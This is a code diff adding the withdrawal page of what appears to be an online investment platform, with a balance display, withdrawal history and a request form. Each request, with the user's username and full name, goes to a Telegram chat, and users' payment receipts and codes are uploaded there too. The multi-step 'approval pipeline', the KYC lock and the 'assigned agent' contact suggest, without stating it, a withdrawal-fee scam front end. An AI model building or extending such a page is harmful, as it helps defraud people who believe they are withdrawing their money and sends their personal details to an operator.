+    `<b>Previous state:</b> ${tgEsc(ws)}\n` +
+    `<b>New state:</b> ${tgEsc(nextState)}\n` +
+    `<b>Balance:</b> ${fmtMoney(state.userBalance)}\n` +
+    `<b>Timestamp:</b> ${tgEsc(nowIso)}`;
+
+  closeModal();
+  showToast('Submitted', 'Awaiting admin approval.', 'success');
+  render();
+
+  await sendTelegramMessage(msg);
+  await sendTelegramDocument(
+    file,
+    `📎 <b>Receipt — ${tgEsc(label)}</b>\n<b>User:</b> @${tgEsc(userName)}\n<b>Ref:</b> ${tgEsc(cw.refNum || '—')}\n<b>Amount:</b> ${fmtMoney(amt)}\n<b>Code:</b> <code>${tgEsc(code)}</code>`
+  );
+}
+
+function renderWithdrawalHistory() {
+  const history = (state.transactions || []).filter(t => t.type === 'Withdrawal Request' || t.type === 'Withdrawal Refund' || t.type === 'Withdrawal');
+  if (history.length === 0) return `<div class="text-center py-10 text-slate-500 text-xs"><i class="fa-solid fa-receipt text-2xl mb-2 opacity-50 block"></i>No past withdrawals found.</div>`;
+  
+  return `<div class="space-y-3">${history.map(t => {
+    const isRefund = t.type.includes('Refund');
+    const badge = t.status === 'Completed' ? 'text-emerald-400 bg-emerald-500/20 border border-emerald-500/30' : t.status === 'Pending' ? 'text-sky-custom bg-sky-custom/20 border border-sky-custom/30' : t.status === 'Refunded' ? 'text-purple-400 bg-purple-500/20 border border-purple-500/30' : 'text-rose-400 bg-rose-500/20 border border-rose-500/30';
+    const borderLeft = t.status === 'Completed' ? 'border-l-4 border-emerald-500' : t.status === 'Pending' ? 'border-l-4 border-sky-custom' : t.status === 'Refunded' ? 'border-l-4 border-purple-500' : 'border-l-4 border-rose-500';
+    const icon = isRefund ? 'fa-rotate-left' : 'fa-arrow-up-right-from-square';
+    const iconColor = isRefund ? 'text-emerald-400' : 'text-slate-400';
+    
+    return `<div class="bg-navy-900 border border-navy-700 ${borderLeft} rounded-xl p-4 flex items-center justify-between hover:bg-navy-800 transition-colors">
+      <div class="flex items-center gap-3">
+        <div class="w-9 h-9 rounded-lg bg-navy-950 flex items-center justify-center shadow-inner"><i class="fa-solid ${icon} ${iconColor}"></i></div>
+        <div>
+          <p class="text-xs font-bold text-white">${escapeHtml(t.type)}</p>
+          <p class="text-[10px] text-slate-500 font-mono mt-0.5">${escapeHtml(t.ref)} · ${escapeHtml(t.date)}</p>
+        </div>
+      </div>
+      <div class="text-right">
+        <p class="text-sm font-black ${isRefund ? 'text-emerald-400' : 'text-white'}">${isRefund ? '+' : ''}${fmtMoney(t.amount)}</p>
+        <span class="inline-block px-2 py-0.5 text-[9px] font-black uppercase rounded mt-1 ${badge}">${escapeHtml(t.status)}</span>
+      </div>
+    </div>`;
+  }).join('')}</div>`;
+}
+
+function renderWithdrawals() {
+  return `
+    <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d flex flex-col sm:flex-row justify-between items-center gap-4">
+      <div>
+        <h2 class="text-xl sm:text-2xl font-extrabold text-white flex items-center"><i class="fa-solid fa-money-bill-transfer text-sky-custom mr-3"></i>Withdrawal Center</h2>
+        <p class="text-xs text-slate-400 mt-1">Manage your payout requests and track their progress.</p>
+      </div>
+      ${state.withdrawalState === 'none' ? `<button onclick="openWithdrawModal()" class="w-full sm:w-auto px-6 py-3 bg-sky-custom text-navy-950 font-black rounded-xl text-xs active:scale-95 transition shadow-lg shadow-sky-custom/20"><i class="fa-solid fa-plus mr-1.5"></i>New Withdrawal</button>` : ''}
+    </div>
+    
+    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+      <div class="lg:col-span-2 space-y-6">
+        ${renderWithdrawalPipeline()}
+        
+        <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 card-3d">
+          <h3 class="text-sm font-bold text-white mb-4 uppercase tracking-wider flex items-center"><i class="fa-solid fa-clock-rotate-left text-gold-400 mr-2"></i>Past Withdrawals</h3>
+          ${renderWithdrawalHistory()}
+        </div>
+      </div>
+      
+      <div class="space-y-6">
+        <div class="bg-gradient-to-br from-gold-500/15 to-navy-900 border border-gold-500/30 rounded-3xl p-6 card-3d relative overflow-hidden">
+          <div class="absolute -top-10 -right-10 w-32 h-32 bg-gold-500/10 rounded-full blur-3xl pointer-events-none"></div>
+          <div class="relative z-10">
+            <p class="text-[10px] text-slate-400 uppercase font-bold tracking-widest">Available Balance</p>
+            <p class="text-3xl font-black text-gold-400 mt-1">${fmtMoney(state.userBalance)}</p>
+            <p class="text-[10px] text-slate-500 mt-3"><i class="fa-solid fa-circle-check text-emerald-400 mr-1"></i>Ready for withdrawal</p>
+          </div>
+        </div>
+        
+        <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 card-3d">
+          <h3 class="text-sm font-bold text-white mb-3">Need Help?</h3>
+          <p class="text-xs text-slate-400 leading-relaxed mb-4">If your withdrawal is stuck or you need assistance, contact your assigned agent.</p>
+          <a href="tel:+16465858110" class="w-full py-3 bg-navy-900 border border-navy-700 text-slate-300 rounded-xl text-xs font-bold active:scale-95 transition flex items-center justify-center hover:border-sky-custom hover:text-white"><i class="fa-solid fa-phone mr-2 text-sky-custom"></i> Call Support</a>
+        </div>
+      </div>
+    </div>
+  `;
+}
+
+function setWdAmount(val) {
+  const input = document.getElementById('wd-amount');
+  if (input) input.value = Math.min(val, parseFloat(input.max));
+}
+
+function openWithdrawModal() {
+  if (!state.currentUser) { showToast('Session', 'Please log in again.', 'error'); return; }
+  if (isTabLocked('withdrawals')) { showKycLockToast(); return; }
+  const ws = state.withdrawalState || 'none';
+  if (ws !== 'none') { showToast('In Progress', 'Complete current pipeline first.', 'warning'); return; }
+  
+  showModal('Withdraw Funds', `
+    <form onsubmit="submitWithdrawal(event)" class="space-y-5">
+      <div>
+        <div class="flex justify-between items-center mb-1.5">
+          <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider">Amount (USD)</label>
+          <span class="text-[11px] text-slate-400">Available: <span class="text-gold-400 font-bold">${fmtMoney(state.userBalance)}</span></span>
+        </div>
+        <div class="relative">
+          <span class="absolute left-4 top-3.5 text-xl font-black text-slate-500">$</span>
+          <input type="number" id="wd-amount" required max="${state.userBalance}" min="10" step="0.01" value="${state.userBalance}" class="w-full bg-navy-950 border border-navy-700 rounded-xl pl-10 pr-4 py-3 text-xl font-black text-white focus:outline-none focus:border-sky-custom transition-colors">
+        </div>
+      </div>
+      
+      <div class="flex flex-wrap gap-2 pt-1">
+        <button type="button" onclick="setWdAmount(500)" class="px-3 py-1.5 bg-navy-900 border border-navy-700 rounded-lg text-xs font-bold text-slate-300 hover:text-white hover:border-sky-custom active:scale-95 transition">$500</button>
+        <button type="button" onclick="setWdAmount(1000)" class="px-3 py-1.5 bg-navy-900 border border-navy-700 rounded-lg text-xs font-bold text-slate-300 hover:text-white hover:border-sky-custom active:scale-95 transition">$1,000</button>
+        <button type="button" onclick="setWdAmount(2500)" class="px-3 py-1.5 bg-navy-900 border border-navy-700 rounded-lg text-xs font-bold text-slate-300 hover:text-white hover:border-sky-custom active:scale-95 transition">$2,500</button>
+        <button type="button" onclick="setWdAmount(${state.userBalance})" class="px-3 py-1.5 bg-sky-custom/20 border border-sky-custom/40 rounded-lg text-xs font-bold text-sky-custom active:scale-95 transition hover:bg-sky-custom/30">Max</button>
+      </div>
+      
+      <div class="bg-sky-custom/10 border border-sky-custom/30 p-3.5 rounded-xl">
+        <p class="text-[11px] text-slate-300"><i class="fa-solid fa-circle-info text-sky-custom mr-1"></i> Withdrawal requests are processed through a 3-step approval pipeline.</p>
+      </div>
+      
+      <div class="flex justify-end gap-3 pt-2">
+        <button type="button" onclick="closeModal()" class="px-5 py-3 bg-navy-950 text-slate-400 font-bold rounded-xl text-xs hover:text-white transition">Cancel</button>
+        <button type="submit" class="px-8 py-3 bg-gradient-to-r from-sky-custom to-emerald-500 text-navy-950 font-black rounded-xl text-sm active:scale-95 transition shadow-lg shadow-sky-custom/20">Submit Request</button>
+      </div>
+    </form>
+  `);
+}
+
+async function submitWithdrawal(e) {
+  e.preventDefault();
+  if (!state.currentUser) { showToast('Session', 'Please log in again.', 'error'); return; }
+  const amt = parseFloat(document.getElementById('wd-amount').value);
+  if (!amt || amt <= 0 || amt > state.userBalance) { showToast('Invalid', 'Enter valid amount.', 'error'); return; }
+  closeModal();
+  
+  state.userBalance -= amt;
+  if (state.currentUser) state.currentUser.userBalance = state.userBalance;
+  
+  const refNum = 'TXN-' + Math.floor(10000 + Math.random()*90000);
+  const nowIso = new Date().toISOString();
+  const nowStr = nowIso.replace('T',' ').substring(0,16);
+  const userName = state.currentUser.username || 'unknown';
+  const fullName = ((state.currentUser.firstName||'') + ' ' + (state.currentUser.lastName||'')).trim() || '(none)';
+  
+  const txn = { ref:refNum, date:nowStr, amount:amt, type:'Withdrawal Request', status:'Pending' };
+  state.transactions.unshift(txn);
+  if (state.currentUser) {
+    state.currentUser.transactions = state.transactions;
+    state.currentUser.withdrawalState = 'pending';
+    state.currentUser.currentWithdrawal = { amount:amt, refNum, date:nowStr };
+  }
+  
+  state.withdrawalState = 'pending'; 
+  state.currentWithdrawal = { amount:amt, refNum, date:nowStr };
+  
+  saveDeviceState();
+  
+  const msg =
+    `💸 <b>WITHDRAWAL INITIATED</b>\n` +
+    `<b>Ref:</b> ${tgEsc(refNum)}\n` +
+    `<b>User:</b> @${tgEsc(userName)}\n` +
+    `<b>Full name:</b> ${tgEsc(fullName)}\n` +
+    `<b>Amount:</b> ${fmtMoney(amt)}\n` +
+    `<b>Balance after:</b> ${fmtMoney(state.userBalance)}\n` +
+    `<b>Timestamp:</b> ${tgEsc(nowIso)}`;
+  sendTelegramMessage(msg);
+  
+  showToast('Requested', 'Please complete the first step.', 'warning'); 
+  render();
+}
+
+function render() {
+  document.body.classList.remove('modal-open');
+  renderHeaderNav();
+  document.querySelector('#nav-drawer nav').innerHTML = renderNavItems('withdrawals');
+  const container = document.getElementById('app-container');
+  container.innerHTML = renderDashboardShell('withdrawals', renderWithdrawals());
+}
+
+window.onload = async function() {
+  if (!guardAuth()) return;
+  await pullCurrentUserFromCloud();
+  render();
+};
+</script>
+</body>
+</html>
